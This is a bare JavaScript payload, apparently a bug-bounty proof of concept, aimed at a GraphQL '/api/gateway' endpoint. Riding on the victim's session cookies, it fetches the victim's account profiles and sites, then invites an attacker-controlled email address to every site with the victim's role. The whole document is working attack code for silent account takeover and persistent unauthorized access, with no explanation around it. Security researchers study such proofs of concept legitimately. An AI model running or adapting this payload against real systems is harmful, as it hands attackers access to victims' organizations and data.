const ATTACKER_EMAIL = "xor-rax-rax+attackerz@bugcrowdninja.com";
const GW = "/api/gateway";

(async() => {
    const r1 = await fetch(GW + "?operation=Account", {
        method: "POST",
        credentials: "include",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            "operationName": "Account",
            "variables": {},
            "extensions": { "clientLibrary": { "name": "@apollo/client", "version": "4.0.4" } },
            "query": "query Account {\n  me {\n    ...AccountOnAccount\n    __typename\n  }\n  msmpOrganizationList(params: {msmpPaginationInput: {limit: 1000}}) {\n    organizations {\n      ...OrganizationOnAccount\n      __typename\n    }\n    __typename\n  }\n}\n\nfragment SiteMetadataOnAccount on SiteMetadataField {\n  id\n  key\n  value\n  __typename\n}\n\nfragment SiteOnAccount on Site {\n  id\n  name\n  logoUrl\n  companyName\n  loginMessage\n  disclaimerMessage\n  disclaimerTitle\n  mode\n  hasTrialPending\n  region\n  msmpOrganizationId\n  settings {\n    hasMfaEnabled\n    hasForcedSSO\n    scopeConditionsLimit\n    maxAllowedScopes\n    isDemo\n    __typename\n  }\n  subscription {\n    type\n    expirationDate\n    assetLimit\n    __typename\n  }\n  hasInstallations\n  installationTypes\n  hasPendingOrder\n  firstAccessPending\n  metadata {\n    ...SiteMetadataOnAccount\n    __typename\n  }\n  subscriptionsHistory {\n    total\n    __typename\n  }\n  __typename\n}\n\nfragment ProfileOnAccount on SiteUserProfile {\n  id\n  status\n  isOwner\n  isFirstLoginPending\n  createdAt\n  nbOwnersInSite\n  roles {\n    id\n    name\n    __typename\n  }\n  site {\n    ...SiteOnAccount\n    __typename\n  }\n  __typename\n}\n\nfragment AccountMetadataOnAccount on AccountMetadataField {\n  id\n  key\n  value\n  __typename\n}\n\nfragment InvitationOnAccount on Invitation {\n  ticket\n  site {\n    id\n    name\n    region\n    logoUrl\n    __typename\n  }\n  __typename\n}\n\nfragment AccountOnAccount on Me {\n  id\n  username\n  email\n  phone\n  name\n  surname\n  fullName\n  imageUrl\n  language\n  timeAndDateDisplay\n  createdAt\n  isSSOAvailable\n  profiles {\n    ...ProfileOnAccount\n    __typename\n  }\n  metadata {\n    ...AccountMetadataOnAccount\n    __typename\n  }\n  invitations {\n    ...InvitationOnAccount\n    __typename\n  }\n  __typename\n}\n\nfragment OrganizationOnAccount on MsmpOrganization {\n  id\n  name\n  isPending\n  ticket\n  type\n  __typename\n}"
        })
    });

    const d = await r1.json();
    const profiles = d.data.me.profiles;

    for (const p of profiles) {
        const siteId = p.site.id;
        const roleId = p.roles[0].id;

        await fetch(GW + "?operation=inviteAccounts", {
            method: "POST",
            credentials: "include",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                "operationName": "inviteAccounts",
                "variables": {
                    "siteId": siteId,
                    "emails": [ATTACKER_EMAIL],
                    "roleIds": [roleId],
                    "groupIds": []
                },
                "extensions": { "clientLibrary": { "name": "@apollo/client", "version": "4.0.4" } },
                "query": "mutation inviteAccounts($siteId: ID!, $emails: [String]!, $roleIds: [ID]!, $groupIds: [ID]) {\n  site(id: $siteId) {\n    id\n    invite(emails: $emails, roleIds: $roleIds, groupIds: $groupIds) {\n      id\n      isOwner\n      isPending\n      account {\n        id\n        email\n        fullName\n        imageUrl\n        __typename\n      }\n      roles {\n        id\n        name\n        __typename\n      }\n      accountGroups {\n        id\n        name\n        roles {\n          id\n          name\n          __typename\n        }\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n}"
            })
        });
    }
})();
